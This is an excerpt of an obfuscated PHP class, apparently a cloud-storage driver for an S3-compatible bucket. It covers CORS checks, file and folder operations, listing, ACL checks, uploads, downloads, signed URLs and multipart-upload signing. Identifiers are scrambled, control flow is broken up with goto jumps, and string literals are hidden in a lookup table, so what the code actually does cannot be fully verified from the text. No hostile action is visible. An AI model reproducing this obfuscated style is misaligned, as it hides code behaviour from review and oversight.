PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Aèƒ–£ƒá²) { set_timeout(); require_once SDK_DIR . $_SERVER[ç][179]; parent::__construct(); $this->_init($Aèƒ–£ƒá²); } public function _init($D“©Üˆ‚½°) { foreach ($D“©Üˆ‚½° as $dì³šÌÁìø => $FåÛËÑŸ¬) { if (isset($this->{$dì³šÌÁìø})) { $this->{$dì³šÌÁìø} = $FåÛËÑŸ¬; } } $this->endpoint = $D“©Üˆ‚½°[$_SERVER[ç][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($bšôï™Şí = "\166\64") { $this->signVer = $bšôï™Şí; $this->client->setSignatureVersion($bšôï™Şí); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto F”ßà­¨‹­; F¼ÃçÜ‡˜ˆ: if ($cÃ¡ï†„¬¦[$fÀºò¬Ò¹³[181]] != $fÀºò¬Ò¹³[182] || $cÃ¡ï†„¬¦[$fÀºò¬Ò¹³[183]] != $fÀºò¬Ò¹³[182]) { return !1; } $D´µæÏÚìŒ = array_map($fÀºò¬Ò¹³[184], $cÃ¡ï†„¬¦[$fÀºò¬Ò¹³[185]]); if (!is_array($D´µæÏÚìŒ)) { $D´µæÏÚìŒ = array(); } goto fåÇÁß“à¾; F”ßà­¨‹­: $fÀºò¬Ò¹³ =& $_SERVER[ç]; $cÃ¡ï†„¬¦ = $this->getBucketCors(); if (!$cÃ¡ï†„¬¦ || !is_array($cÃ¡ï†„¬¦)) { return !1; } goto F¼ÃçÜ‡˜ˆ; fåÇÁß“à¾: $f”ã¸Ìº¿ = array($fÀºò¬Ò¹³[186], $fÀºò¬Ò¹³[187], $fÀºò¬Ò¹³[188], $fÀºò¬Ò¹³[189], $fÀºò¬Ò¹³[190]); $B–­‹Ä„Ñ = array_diff($f”ã¸Ìº¿, $D´µæÏÚìŒ); return empty($B–­‹Ä„Ñ); goto Bø“’¶¤Ï; Bø“’¶¤Ï: } public function mkfile($c³äæÊ‹š¢, $Aç¾§ÕŠÑÂ = '', $aÚ­·…Ï› = REPEAT_RENAME) { $CªòœôÒËô = $this->setContent($c³äæÊ‹š¢, $Aç¾§ÕŠÑÂ); if ($CªòœôÒËô !== !1) { return $this->getPathOuter($c³äæÊ‹š¢); } return !1; } public function mkdir($c¥¯ˆà›ò, $b‰‚ŠÉÛš« = REPEAT_SKIP) { if (empty($c¥¯ˆà›ò)) { return !1; } if ($this->_isFolder($c¥¯ˆà›ò)) { return $this->getPathOuter($c¥¯ˆà›ò); } $eÚ»Ñˆ«Æ´ = $this->setContent($c¥¯ˆà›ò, $_SERVER[ç][33], !0); if ($eÚ»Ñˆ«Æ´ !== !1) { return $this->getPathOuter($c¥¯ˆà›ò); } return !1; } public function copyFile($fƒ»”‡¥Ò†, $E¢îÒèÏèğ, $aë›êŸİšÔ = array()) { $CİåÂó‘Ş™ =& $_SERVER[ç]; $fğ•œù´¸ = $this->objectMeta($fƒ»”‡¥Ò†); if (!$fğ•œù´¸) { return !1; } if ($fğ•œù´¸[$CİåÂó‘Ş™[77]] <= 1024 * 1024 * 200) { $c»–àäá¤ = $this->client->copyObject($this->bucket, $fƒ»”‡¥Ò†, $this->bucket, $E¢îÒèÏèğ, $CİåÂó‘Ş™[191], $aë›êŸİšÔ); } else { $c»–àäá¤ = $this->client->multiCopyObject($this->bucket, $fƒ»”‡¥Ò†, $this->bucket, $E¢îÒèÏèğ, $aë›êŸİšÔ); } $c»–àäá¤ = $c»–àäá¤ ? $this->getPathOuter($E¢îÒèÏèğ) : !1; return $c»–àäá¤; } public function moveFile($cÅ·Ç³¢Š, $b¡ßÜÁ÷º¬) { if ($this->copyFile($cÅ·Ç³¢Š, $b¡ßÜÁ÷º¬)) { $this->delFile($cÅ·Ç³¢Š); return $this->getPathOuter($b¡ßÜÁ÷º¬); } return !1; } public function delFile($a™¶ÔİÓ±ì) { return $this->client->deleteObject($this->bucket, $a™¶ÔİÓ±ì); } public function delFolder($c‹§„¯íÑ­) { goto A®¶¨ÆÅ´; Bùœ‰ÂíœÍ: if (!empty($c‹§„¯íÑ­) && !in_array($E¥©•Ä¿Î, $cê²ê½Îâ¬[$CÄĞ„²ˆô[74]])) { $cê²ê½Îâ¬[$CÄĞ„²ˆô[74]][] = $E¥©•Ä¿Î; } $A‘éğ”©Š• = $this->delByBatch($cê²ê½Îâ¬[$CÄĞ„²ˆô[73]]); if (!$A‘éğ”©Š•) { return !1; } goto B³÷”°…; Dİïõ…¿½‹: $cê²ê½Îâ¬ = $this->fileList($c‹§„¯íÑ­); $this->listItemCache = !0; $E¥©•Ä¿Î = trim($c‹§„¯íÑ­, $CÄĞ„²ˆô[8]) . $CÄĞ„²ˆô[8]; goto Bùœ‰ÂíœÍ; B³÷”°…: return $this->delByBatch($cê²ê½Îâ¬[$CÄĞ„²ˆô[74]]); goto C¿²©Àè®; A®¶¨ÆÅ´: $CÄĞ„²ˆô =& $_SERVER[ç]; if (!$this->exist($c‹§„¯íÑ­)) { return !0; } $this->listItemCache = !1; goto Dİïõ…¿½‹; C¿²©Àè®: } private function delByBatch($eİ«•ÖÖä‘) { foreach (array_chunk($eİ«•ÖÖä‘, 1000) as $FÀ‹„Ò‰ç ) { $eÊ£ËìÀ•¢ = $this->client->deleteObjects($this->bucket, $FÀ‹„Ò‰ç ); if (!$eÊ£ËìÀ•¢) { return !1; } } return !0; } public function rename($A»ÅùÜé¿, $d½¢¾›îåš) { return $this->renameObject($A»ÅùÜé¿, $d½¢¾›îåš); } public function listPath($b¨ô¾êƒÈõ, $B©Ä‰ïÙ§Ø = false) { $Fß»äßë‹É =& $_SERVER[ç]; $bØÖï•¤Ñò = $this->fileList($b¨ô¾êƒÈõ, $Fß»äßë‹É[8], !0); foreach ($bØÖï•¤Ñò[$Fß»äßë‹É[74]] as $CÅô’‰…ĞÊ => $Böä¦µ¢¤İ) { $bØÖï•¤Ñò[$Fß»äßë‹É[74]][$CÅô’‰…ĞÊ] = $this->folderInfo($Böä¦µ¢¤İ, $B©Ä‰ïÙ§Ø); } foreach ($bØÖï•¤Ñò[$Fß»äßë‹É[73]] as $CÅô’‰…ĞÊ => $Böä¦µ¢¤İ) { $bØÖï•¤Ñò[$Fß»äßë‹É[73]][$CÅô’‰…ĞÊ] = $this->fileInfo($Böä¦µ¢¤İ[$Fß»äßë‹É[28]], $B©Ä‰ïÙ§Ø, $Böä¦µ¢¤İ); } return $bØÖï•¤Ñò; } private function fileInfo($DÄ¹¾ÕÁ¾ñ, $D–°¿×°î¨ = false, $A¨å¹ŒÅˆÅ = array()) { goto d½à™Ãöª¶; eºËñ‚äÜ†: if (isset($A¨å¹ŒÅˆÅ[$CÅåˆÚ”“Å[195]])) { $aÄå¤äİí[$CÅåˆÚ”“Å[83]] = $A¨å¹ŒÅˆÅ[$CÅåˆÚ”“Å[195]]; } if (isset($A¨å¹ŒÅˆÅ[$CÅåˆÚ”“Å[77]])) { $aÄå¤äİí[$CÅåˆÚ”“Å[77]] = $A¨å¹ŒÅˆÅ[$CÅåˆÚ”“Å[77]]; } return $aÄå¤äİí; goto C‹ÓÄ½õÛ½; d½à™Ãöª¶: $CÅåˆÚ”“Å =& $_SERVER[ç]; $aÄå¤äİí = array($CÅåˆÚ”“Å[28] => $this->pathThis($DÄ¹¾ÕÁ¾ñ), $CÅåˆÚ”“Å[75] => $this->getPathOuter($DÄ¹¾ÕÁ¾ñ), $CÅåˆÚ”“Å[29] => $CÅåˆÚ”“Å[173], $CÅåˆÚ”“Å[167] => $this->ext($DÄ¹¾ÕÁ¾ñ), $CÅåˆÚ”“Å[77] => isset($A¨å¹ŒÅˆÅ[$CÅåˆÚ”“Å[77]]) ? $A¨å¹ŒÅˆÅ[$CÅåˆÚ”“Å[77]] : 0); if ($D–°¿×°î¨) { return $aÄå¤äİí; } goto E‰ÄîÁ…ä; E‰ÄîÁ…ä: $aÄå¤äİí[$CÅåˆÚ”“Å[192]] = $aÄå¤äİí[$CÅåˆÚ”“Å[83]] = 0; $aÄå¤äİí[$CÅåˆÚ”“Å[193]] = $aÄå¤äİí[$CÅåˆÚ”“Å[194]] = !0; if (empty($A¨å¹ŒÅˆÅ)) { $A¨å¹ŒÅˆÅ = $this->objectMeta($DÄ¹¾ÕÁ¾ñ); if (!$A¨å¹ŒÅˆÅ) { return $aÄå¤äİí; } } goto eºËñ‚äÜ†; C‹ÓÄ½õÛ½: } private function folderInfo($bëóöÓ„°, $eŸôóÊÌ£ = false) { goto e¡‡½¾Êùá; fºÅ†…“½î: $f×•İ¡–Ï[$B‘«Âî ’é[192]] = $f×•İ¡–Ï[$B‘«Âî ’é[83]] = 0; $f×•İ¡–Ï[$B‘«Âî ’é[193]] = $f×•İ¡–Ï[$B‘«Âî ’é[194]] = !0; if ($bëóöÓ„° == $B‘«Âî ’é[33]) { return $f×•İ¡–Ï; } goto Câ•àªØİÔ; C‰—¾³ã: return $f×•İ¡–Ï; goto bÏÔùÚ£â–; e¡‡½¾Êùá: $B‘«Âî ’é =& $_SERVER[ç]; $f×•İ¡–Ï = array($B‘«Âî ’é[28] => $this->pathThis($bëóöÓ„°), $B‘«Âî ’é[75] => $this->getPathOuter($B‘«Âî ’é[8] . $bëóöÓ„°), $B‘«Âî ’é[29] => $B‘«Âî ’é[76]); if ($eŸôóÊÌ£) { return $f×•İ¡–Ï; } goto fºÅ†…“½î; Câ•àªØİÔ: $bëóöÓ„° = trim($bëóöÓ„°, $B‘«Âî ’é[8]) . $B‘«Âî ’é[8]; $aàªõİˆ¤½ = $this->objectMeta($bëóöÓ„°); if (isset($aàªõİˆ¤½[$B‘«Âî ’é[195]])) { $f×•İ¡–Ï[$B‘«Âî ’é[192]] = $aàªõİˆ¤½[$B‘«Âî ’é[195]]; } goto C‰—¾³ã; bÏÔùÚ£â–: } private function fileList($EŠ­Š¸ĞŠ•, $eèˆ»øªÚ‰ = '', $CçˆÁ£é˜¯ = 0) { goto D©ŒæÆâê; eíöÑ¯£ã: return array($C£²‹»Òˆ[74] => $aİÑ‡ÍŸæ, $C£²‹»Òˆ[73] => $DÂ˜íóµÛ); goto F©Ù¨äÏÂ; FàÜÄïÄë‚: if (!$bğÃˆ¢©¢Ã) { return array($C£²‹»Òˆ[74] => array(), $C£²‹»Òˆ[73] => array()); } $F‚™ÎÓ­·Ó = $this->listItemCache === !1 ? !1 : !0; $aİÑ‡ÍŸæ = $DÂ˜íóµÛ = array(); goto aÄô¢õëÚ; aÄô¢õëÚ: foreach ($bğÃˆ¢©¢Ã[$C£²‹»Òˆ[196]] as $a©·é¡Ö¤ù) { goto a‚‰¡š•æ; a‚‰¡š•æ: $a×˜İˆ£¤Î = $a©·é¡Ö¤ù[$C£²‹»Òˆ[28]]; if ($a×˜İˆ£¤Î == $a—¬ùÆÆÒ¡) { continue; } $BÀ±ÁªÏ = isset($a©·é¡Ö¤ù[$C£²‹»Òˆ[77]]) ? $a©·é¡Ö¤ù[$C£²‹»Òˆ[77]] : 0; goto D‘š¿¿ä“; BÇÅ°¬é»ã: $DÂ˜íóµÛ[] = $CçˆÁ£é˜¯ ? $a©·é¡Ö¤ù : $a×˜İˆ£¤Î; goto BÁÂ®‰‡„; D‘š¿¿ä“: $F¯ƒ°‚Ş¢‹ = $BÀ±ÁªÏ == 0 && substr($a×˜İˆ£¤Î, strlen($a×˜İˆ£¤Î) - 1, 1) == $C£²‹»Òˆ[8] ? !0 : !1; if ($F‚™ÎÓ­·Ó) { $this->cacheMethod($C£²‹»Òˆ[197], $a×˜İˆ£¤Î, $F¯ƒ°‚Ş¢‹); $this->cacheMethod($C£²‹»Òˆ[198], $a×˜İˆ£¤Î, $a©·é¡Ö¤ù); } if ($F¯ƒ°‚Ş¢‹) { $aİÑ‡ÍŸæ[] = $a×˜İˆ£¤Î; continue; } goto BÇÅ°¬é»ã; BÁÂ®‰‡„: } foreach ($bğÃˆ¢©¢Ã[$C£²‹»Òˆ[199]] as $a©·é¡Ö¤ù) { $aİÑ‡ÍŸæ[] = $a©·é¡Ö¤ù[$C£²‹»Òˆ[28]]; if ($F‚™ÎÓ­·Ó) { $this->cacheMethod($C£²‹»Òˆ[197], $a©·é¡Ö¤ù[$C£²‹»Òˆ[28]], !0); } } if ($F‚™ÎÓ­·Ó) { $this->cacheMethod($C£²‹»Òˆ[197], $EŠ­Š¸ĞŠ•, !0); } goto eíöÑ¯£ã; D©ŒæÆâê: $C£²‹»Òˆ =& $_SERVER[ç]; $a—¬ùÆÆÒ¡ = rtrim($EŠ­Š¸ĞŠ•, $C£²‹»Òˆ[8]) . $C£²‹»Òˆ[8]; $bğÃˆ¢©¢Ã = $this->listObjs($a—¬ùÆÆÒ¡, null, null, $eèˆ»øªÚ‰); goto FàÜÄïÄë‚; F©Ù¨äÏÂ: } private function listObjs($c¯Ãõæ™‡Õ, $b»ÁñËÂã = null, $fï…äë©Á¹ = null, $EÈ¾ÜÎàŸâ = null) { $CŠ¬àÁ˜Ê¡ =& $_SERVER[ç]; $c¯Ãõæ™‡Õ = trim($c¯Ãõæ™‡Õ, $CŠ¬àÁ˜Ê¡[8]); $C¼ƒ¤‡–¨Ã = empty($c¯Ãõæ™‡Õ) ? $CŠ¬àÁ˜Ê¡[33] : $c¯Ãõæ™‡Õ . $CŠ¬àÁ˜Ê¡[8]; return $this->client->getBucket($this->bucket, $C¼ƒ¤‡–¨Ã, $b»ÁñËÂã, $fï…äë©Á¹, $EÈ¾ÜÎàŸâ, !0); } public function has($fì²µÄå, $CÍİå×Óš„ = false, $e…‰ø÷’•ä = true) { goto Aôæã›ĞˆÌ; b¢ƒ†³İä: $fĞ£‡À¹¸¦ = $F–ÎØéá×ª = array(); while (!0) { $eŠªÆã­Êæ = $this->listObjs($fì²µÄå, $f¾•åÚÈ„‚, $FŠĞ´¤Æ¯, $a×ˆ“ë“Õ); if (!$eŠªÆã­Êæ) { break; } $f¾•åÚÈ„‚ = $eŠªÆã­Êæ[$E‡„ŒÇ…º‘[200]]; $CË‹‡††î = $eŠªÆã­Êæ[$E‡„ŒÇ…º‘[196]]; $EÑƒ¢†›¬ = $eŠªÆã­Êæ[$E‡„ŒÇ…º‘[199]]; if (empty($CË‹‡††î) && empty($EÑƒ¢†›¬)) { break; } if (count($CË‹‡††î) == 1 && $CË‹‡††î[0][$E‡„ŒÇ…º‘[28]] == $c”Ñ„éÓ â) { break; } if ($CÍİå×Óš„) { if (count($CË‹‡††î)) { $CË‹‡††î = array_column($CË‹‡††î, $E‡„ŒÇ…º‘[28]); $fĞ£‡À¹¸¦ = array_merge($fĞ£‡À¹¸¦, $CË‹‡††î); } if (count($EÑƒ¢†›¬)) { $EÑƒ¢†›¬ = array_column($EÑƒ¢†›¬, $E‡„ŒÇ…º‘[28]); $F–ÎØéá×ª = array_merge($F–ÎØéá×ª, $EÑƒ¢†›¬); } if ($f¾•åÚÈ„‚ === null) { break; } continue; } if ($e…‰ø÷’•ä) { if (!empty($CË‹‡††î)) { if (count($CË‹‡††î) > 1 || isset($CË‹‡††î[0][$E‡„ŒÇ…º‘[28]]) && $CË‹‡††î[0][$E‡„ŒÇ…º‘[28]] != $c”Ñ„éÓ â) { return !0; } } } else { if (!empty($EÑƒ¢†›¬)) { return !0; } } if ($f¾•åÚÈ„‚ === null) { break; } } if ($CÍİå×Óš„) { $fĞ£‡À¹¸¦ = array_diff($fĞ£‡À¹¸¦, array($c”Ñ„éÓ â)); $fĞ£‡À¹¸¦ = count(array_unique($fĞ£‡À¹¸¦)); $F–ÎØéá×ª = count(array_unique($F–ÎØéá×ª)); return array($E‡„ŒÇ…º‘[201] => $fĞ£‡À¹¸¦, $E‡„ŒÇ…º‘[202] => $F–ÎØéá×ª); } goto Bª›ÓÓÊë„; Aôæã›ĞˆÌ: $E‡„ŒÇ…º‘ =& $_SERVER[ç]; $fì²µÄå = trim($fì²µÄå, $E‡„ŒÇ…º‘[8]); $c”Ñ„éÓ â = empty($fì²µÄå) ? $E‡„ŒÇ…º‘[33] : $fì²µÄå . $E‡„ŒÇ…º‘[8]; goto CÅ»»»ÔÌõ; Bª›ÓÓÊë„: return !1; goto eÕŠ¬¾„ä; CÅ»»»ÔÌõ: $f¾•åÚÈ„‚ = null; $FŠĞ´¤Æ¯ = 500; $a×ˆ“ë“Õ = $E‡„ŒÇ…º‘[8]; goto b¢ƒ†³İä; eÕŠ¬¾„ä: } public function listAll($BÂÖéÈßæø) { $EïÍ¥Ô·ñš =& $_SERVER[ç]; $EìßˆÈØøÇ = $this->fileList($BÂÖéÈßæø, $EïÍ¥Ô·ñš[33], !0); $cë®Ùö·ñÍ = array(); foreach ($EìßˆÈØøÇ[$EïÍ¥Ô·ñš[73]] as $fÓˆæ±ÀÕË) { $cë®Ùö·ñÍ[$fÓˆæ±ÀÕË[$EïÍ¥Ô·ñš[28]]] = $fÓˆæ±ÀÕË[$EïÍ¥Ô·ñš[77]]; } foreach ($EìßˆÈØøÇ[$EïÍ¥Ô·ñš[74]] as $fÓˆæ±ÀÕË) { if (is_string($fÓˆæ±ÀÕË)) { $cë®Ùö·ñÍ[$fÓˆæ±ÀÕË] = 0; } } return $this->listAllFiles($BÂÖéÈßæø, array_keys($cë®Ùö·ñÍ), $cë®Ùö·ñÍ); } public function canRead($F»«İ…ÒŒ‘) { $F¯¼¶Çã¦ =& $_SERVER[ç]; $B²´˜¼õÃ¥ = $this->client->getAccessControlPolicy($this->bucket, $F»«İ…ÒŒ‘); if (!$B²´˜¼õÃ¥) { return !1; } return in_array($B²´˜¼õÃ¥, array($F¯¼¶Çã¦[203], $F¯¼¶Çã¦[204], $F¯¼¶Çã¦[205])) ? !0 : !1; } public function canWrite($C»”›½çÕ·) { $DÇè«‚Ö¤ì =& $_SERVER[ç]; $a×“Ä¡İÄá = $this->client->getAccessControlPolicy($this->bucket, $C»”›½çÕ·); if (!$a×“Ä¡İÄá) { return !1; } return in_array($a×“Ä¡İÄá, array($DÇè«‚Ö¤ì[203], $DÇè«‚Ö¤ì[204])) ? !0 : !1; } public function getContent($a­‹‡Ÿë”¯) { return $this->client->getObject($this->bucket, $a­‹‡Ÿë”¯); } public function setContent($B¼æ‘ãÔŞ, $A‚öÙ”øÔ = '', $BÇ“Ş«è¬Ñ = false) { goto eŠŠ¿Üù‘; DÕò•°: $this->cacheMethod(null, null); $C„­„ù´Åº = $this->copyFile($B¼æ‘ãÔŞ, $B¼æ‘ãÔŞ, array($Eöéé©ˆç[206] => $C„­„ù´Åº[$Eöéé©ˆç[207]])); return $C„­„ù´Åº ? !0 : !1; goto E–§ÙÑ¡; eŠŠ¿Üù‘: $Eöéé©ˆç =& $_SERVER[ç]; $B¼æ‘ãÔŞ = $BÇ“Ş«è¬Ñ ? trim($B¼æ‘ãÔŞ, $Eöéé©ˆç[8]) . $Eöéé©ˆç[8] : $B¼æ‘ãÔŞ; $E”ƒ‡­ë‹§ = get_file_mime(get_path_ext($B¼æ‘ãÔŞ)); goto D°‡¹›à»†; D°‡¹›à»†: $C„­„ù´Åº = $this->client->putObject($A‚öÙ”øÔ, $this->bucket, $B¼æ‘ãÔŞ, $Eöéé©ˆç[191], array(), $E”ƒ‡­ë‹§); if (!$C„­„ù´Åº) { return !1; } if ($BÇ“Ş«è¬Ñ) { return !0; } goto DÕò•°; E–§ÙÑ¡: } public function fileSubstr($aèÑ¾İé, $díã¾¡¹ÃÍ, $d•©ÃÒí‘) { $aëŸ…çŸ¡À = $díã¾¡¹ÃÍ + $d•©ÃÒí‘ - 1; return $this->client->getObject($this->bucket, $aèÑ¾İé, array($_SERVER[ç][208] => "\x62\x79\x74\145\163\75{$díã¾¡¹ÃÍ}\x2d{$aëŸ…çŸ¡À}")); } public function upload($Bíğ·³çœ, $AáÄéÑøæÚ, $A¼Ï•Ş·„ø = false, $dÕ³—„Ÿì = REPEAT_REPLACE) { $bÁ³å„„œ† =& $_SERVER[ç]; $E×É•Šºõ… = array($bÁ³å„„œ†[206] => @md5_file($AáÄéÑøæÚ)); $BÁ­âÂÁÍ¤ = array($bÁ³å„„œ†[209] => get_file_mime(get_path_ext($Bíğ·³çœ))); if (IO::size($AáÄéÑøæÚ) <= 1024 * 1024 * 200) { $e¼•¾øí‘ = $this->client->putObjectFile($AáÄéÑøæÚ, $this->bucket, $Bíğ·³çœ, $bÁ³å„„œ†[191], $E×É•Šºõ…, $BÁ­âÂÁÍ¤); return !empty($e¼•¾øí‘) ? $this->getPathOuter($Bíğ·³çœ) : !1; } $e«®ˆÀÛ¢ = $this->client->multiUploadObject($AáÄéÑøæÚ, $this->bucket, trim($Bíğ·³çœ, $bÁ³å„„œ†[8]), $E×É•Šºõ…, $BÁ­âÂÁÍ¤); return $e«®ˆÀÛ¢ ? $this->getPathOuter($Bíğ·³çœ) : !1; } public function download($FìÒ¥ù×Ñ, $f©•»È¸ÜĞ) { if (!@is_dir($this->pathFather($f©•»È¸ÜĞ)) && !IO::mkdir($this->pathFather($f©•»È¸ÜĞ))) { return !1; } $e¨ëÇÄ¹ê¶ = $this->client->getObject($this->bucket, $FìÒ¥ù×Ñ, array(), $f©•»È¸ÜĞ); return $e¨ëÇÄ¹ê¶ !== !1 ? $f©•»È¸ÜĞ : !1; } public function link($Aœõ§Î§ºŞ, $Cäí´×™—ó = array()) { $f¢ÅÃí¥×… =& $_SERVER[ç]; if ($this->signVer == $f¢ÅÃí¥×…[210]) { return $this->client->getAuthenticatedURL($this->bucket, $Aœõ§Î§ºŞ, 3600 * 12, $Cäí´×™—ó); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Aœõ§Î§ºŞ, $f¢ÅÃí¥×…[8]), 3600 * 12, $this->region, array(), !0, $Cäí´×™—ó); } public function fileOut($FøÅ©—¨ß­, $B”¨ƒ¡»ğ© = false, $F®ˆÚô×Å¸ = false, $Cçİ®‚Ï‚ = '') { goto E“ÎÅ‡–Èñ; E“ÎÅ‡–Èñ: $CßŸøŸøæ® =& $_SERVER[ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($FøÅ©—¨ß­, $B”¨ƒ¡»ğ©, $F®ˆÚô×Å¸, $Cçİ®‚Ï‚); } if (!$F®ˆÚô×Å¸) { $F®ˆÚô×Å¸ = $this->pathThis($FøÅ©—¨ß­); } goto E„¥‰³ŠÍ; C•®Œòëî: $aÈá¹ Ï·î = array($CßŸøŸøæ®[214] => $B”¨ƒ¡»ğ© . $CßŸøŸøæ®[215] . rawurlencode($F®ˆÚô×Å¸), $CßŸøŸøæ®[216] => $a‰¨ÚïÏ¤ï); $bÕĞ†½œ‰Õ = $this->link($FøÅ©—¨ß­, $aÈá¹ Ï·î); $this->fileOutLink($bÕĞ†½œ‰Õ); goto eŞ±ƒ¯…Ë; E„¥‰³ŠÍ: $a‰¨ÚïÏ¤ï = get_file_mime(get_path_ext($F®ˆÚô×Å¸)); if ($a‰¨ÚïÏ¤ï == $CßŸøŸøæ®[211]) { return parent::fileOut($FøÅ©—¨ß­, $B”¨ƒ¡»ğ©, $F®ˆÚô×Å¸, $Cçİ®‚Ï‚); } $B”¨ƒ¡»ğ© = $B”¨ƒ¡»ğ© ? $CßŸøŸøæ®[212] : $CßŸøŸøæ®[213]; goto C•®Œòëî; eŞ±ƒ¯…Ë: } public function fileOutServer($D‘Á„öÈÉ, $a·¬å÷ÄÉ = false, $f‰•Èãé¯Œ = false, $aæ à§­² = '') { parent::fileOut($D‘Á„öÈÉ, $a·¬å÷ÄÉ, $f‰•Èãé¯Œ, $aæ à§­²); } public function fileOutImageServer($a©×„´æ¬, $Dëå©º°Ñ = 250) { parent::fileOutImage($a©×„´æ¬, $Dëå©º°Ñ); } public function hashMd5($b®Å¿ÒƒÇ, $bİĞêƒ•ˆí = '') { $eà·ÛÜ÷Ÿñ =& $_SERVER[ç]; $Dœœƒäã½ô = $this->objectMeta($b®Å¿ÒƒÇ); if (!$Dœœƒäã½ô) { return !1; } $bİĞêƒ•ˆí = $bİĞêƒ•ˆí ? $bİĞêƒ•ˆí : _get($Dœœƒäã½ô, $eà·ÛÜ÷Ÿñ[217]); $bİĞêƒ•ˆí = $bİĞêƒ•ˆí ? $bİĞêƒ•ˆí : _get($Dœœƒäã½ô, $eà·ÛÜ÷Ÿñ[207], $eà·ÛÜ÷Ÿñ[33]); return $bİĞêƒ•ˆí; } public function uploadFormData($B¬œ¡åŞÌ, $Bß¿°®Ë‹ã = 3600) { $f¾ô„µµğŠ =& $_SERVER[ç]; $d¬£ÅàÄ¸» = $this->pathFather($B¬œ¡åŞÌ); $e¢ÒÄ¤Ó«¼ = $this->client->getHttpUploadPostParams($this->bucket, $d¬£ÅàÄ¸», $f¾ô„µµğŠ[191], $Bß¿°®Ë‹ã); return array_merge((array) $e¢ÒÄ¤Ó«¼, array($f¾ô„µµğŠ[175] => $this->getHost())); } public function multiUploadFormData($F‚ƒÓÎëÅ¼, $C›Ï¬ø´‚• = 3600) { $aŸ­…½Í†² =& $_SERVER[ç]; $E”»•¯İŠ¯ = gmdate($aŸ­…½Í†²[218]); $BêÔÒÇÊ = array(); $f¨”Àáíãó = $this->client->getUploadId($this->bucket, $F‚ƒÓÎëÅ¼, $BêÔÒÇÊ); if (!$f¨”Àáíãó) { return !1; } return array($aŸ­…½Í†²[219] => $f¨”Àáíãó, $aŸ­…½Í†²[175] => $this->getHost() . $aŸ­…½Í†²[8] . $this->pathEncode($F‚ƒÓÎëÅ¼), $aŸ­…½Í†²[220] => $E”»•¯İŠ¯, $aŸ­…½Í†²[92] => $F‚ƒÓÎëÅ¼); } public function multiUploadAuthData($e…¸Å³éñ¼, $C±„±ìÊÈ = array()) { goto cìîß¢ŸÆß; dÕñíä©ï¸: $FÛù¦ôÊĞ = array($eÒ¹ùîÊÒŸ[222], $eÒ¹ùîÊÒŸ[33], $eÒ¹ùîÊÒŸ[118], $eÒ¹ùîÊÒŸ[33], "\170\55\x61\155\x7a\x2d\x64\x61\164\x65\x3a{$f’ß¢õÉòÆ}", $eÒ¹ùîÊÒŸ[8] . $this->bucket . $eÒ¹ùîÊÒŸ[8] . $this->pathEncode($aÙ¥ÒÌã¿×) . $cõ‚ –Ìº); if (strpos($cõ‚ –Ìº, $eÒ¹ùîÊÒŸ[223]) === 0) { $FÛù¦ôÊĞ[0] = $eÒ¹ùîÊÒŸ[224]; } if (isset($C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[225]]) && $C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[225]] == $eÒ¹ùîÊÒŸ[226]) { $FÛù¦ôÊĞ[0] = $eÒ¹ùîÊÒŸ[226]; } goto cË§ª½ªéé; cìîß¢ŸÆß: $eÒ¹ùîÊÒŸ =& $_SERVER[ç]; $f’ß¢õÉòÆ = isset($C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[220]]) ? $C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[220]] : gmdate($eÒ¹ùîÊÒŸ[218]); $cõ‚ –Ìº = isset($C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[167]]) ? $C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[167]] : $eÒ¹ùîÊÒŸ[33]; goto eäÎï¥‚ÖÔ; cË§ª½ªéé: $a‹ŒŒ¼¼¡ç = implode($eÒ¹ùîÊÒŸ[227], $FÛù¦ôÊĞ); $fŒâ“Š›ƒ = base64_encode(hash_hmac($eÒ¹ùîÊÒŸ[228], $a‹ŒŒ¼¼¡ç, $this->secret, !0)); $dš•›î„° = $eÒ¹ùîÊÒŸ[229] . $this->accessKey . $eÒ¹ùîÊÒŸ[4] . $fŒâ“Š›ƒ; goto cµÇğİ¦àº; cµÇğİ¦àº: if (strpos($cõ‚ –Ìº, $eÒ¹ùîÊÒŸ[223]) === 0) { return array($eÒ¹ùîÊÒŸ[230] => $dš•›î„°, $eÒ¹ùîÊÒŸ[220] => $f’ß¢õÉòÆ); } return $dš•›î„°; goto C–‘„±ºè; eäÎï¥‚ÖÔ: $aÙ¥ÒÌã¿× = $C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[92]]; unset($C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[92]]); if (isset($C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[221]])) { $C±„±ìÊÈ[$eÒ¹ùîÊÒŸ[220]] = $f’ß¢õÉòÆ; return $this->listUploadParts($aÙ¥ÒÌã¿×, $C±„±ìÊÈ); } goto dÕñíä©ï¸; C–‘„±ºè: } public function listUploadParts($AğÌŒ×ÚÍ, $fµ ÖÍ†Ş‚ = array()) { goto a·ÌùÙäïÌ; a·ÌùÙäïÌ: $fÌ‘°İ”Ô” =& $_SERVER[ç]; $dì‡îˆÅÃÅ = str_replace($fÌ‘°İ”Ô”[231], $fÌ‘°İ”Ô”[33], $fµ ÖÍ†Ş‚[$fÌ‘°İ”Ô”[167]]); $Cô¤Áš†Ÿå = $this->client->listParts($this->bucket, $AğÌŒ×ÚÍ, $dì‡îˆÅÃÅ); goto Dº«¦ôÎµ; Dº«¦ôÎµ: if (!$Cô¤Áš†Ÿå) { return !1; } unset($fµ ÖÍ†Ş‚[$fÌ‘°İ”Ô”[221]], $fµ ÖÍ†Ş‚[$fÌ‘°İ”Ô”[225]]); $fµ ÖÍ†Ş‚[$fÌ‘°İ”Ô”[92]] = $AğÌŒ×ÚÍ; goto bß­ƒÊ“¯…; bß­ƒÊ“¯…: 